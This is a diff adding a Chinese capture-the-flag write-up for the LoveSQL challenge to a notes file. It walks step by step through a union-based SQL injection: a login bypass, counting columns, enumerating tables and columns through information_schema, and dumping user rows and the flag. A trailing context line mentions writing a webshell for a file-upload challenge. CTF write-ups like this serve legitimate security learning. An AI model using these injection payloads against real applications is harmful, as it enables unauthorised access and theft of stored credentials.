@@ -1344,6 +1344,91 @@ PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1
 
 ------
 
+### [极客大挑战 2019]LoveSQL
+
+输入用户名和密码尝试注入。
+
+```
+admin' or 1=1#    // 用户名
+6                 // 密码随便填
+```
+
+跳转页面`/check.php?username=admin%27+and+1%3D1%23&password=6`。
+
+```
+Login Success!
+Hello admin！
+Your password is '153c45348999cba120b33265dd3f7743
+```
+
+`/check.php?username=admin%27%20order%20by%203%23&password=6`查询字段数发现是`3`。
+
+```
+admin' order by 1#     // Login Success!
+admin' order by 2#     // Login Success!
+admin' order by 3#     // Login Success!
+admin' order by 4#     // Unknown column '4' in 'order clause'
+```
+
+用`union`查询测试注入点（回显点位）：
+
+```
+1' union select 1,2,3#
+```
+
+得到回显点位为`2`和`3`。
+
+```
+Login Success!
+Hello 2！
+Your password is '3'
+```
+
+`/check.php?username=1%27%20union%20select%201%2Cdatabase%28%29%2Cversion%28%29%23&password=6`查询当前数据库名及版本，当前数据库为`geek`。
+
+```
+1' union select 1,database(),version()#
+
+/check.php?username=1' union select 1,database(),version()%23&password=6
+
+Login Success!
+Hello geek！
+Your password is '10.3.18-MariaDB'
+```
+
+`/check.php?username=1%27%20union%20select%201,%27Dad%27,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23&password=6`爆出当前数据库中的所有表名。
+
+```
+/check.php?username=1' union select 1,'Dad',group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=6
+
+Login Success!
+Hello Dad！
+Your password is 'geekuser,l0ve1ysq1'
+```
+
+`/check.php?username=1%27%20union%20select%201,%27Dad%27,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27l0ve1ysq1%27%23&password=6`爆出`l0ve1ysq1`的字段。
+
+```
+/check.php?username=1' union select 1,'Dad',group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=6
+
+Login Success!
+Hello Dad！
+Your password is 'id,username,password'
+```
+
+`/check.php?username=1%27%20union%20select%201,%27Dad%27,group_concat(id,username,password)%20from%20l0ve1ysq1%23&password=6`爆数据。
+
+```
+/check.php?username=1' union select 1,'Dad',group_concat(id,username,password) from l0ve1ysq1%23&password=6
+
+Hello Dad！
+Your password is '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{2a71b9a8-88dd-46ee-a6d4-c351c082366a}'
+```
+
+提交`flag{2a71b9a8-88dd-46ee-a6d4-c351c082366a}`即可。
+
+------
+
 ### [极客大挑战 2019]Upload
 
 文件上传题。编写一句话木马，上传`.php`文件后显示**Not image!**
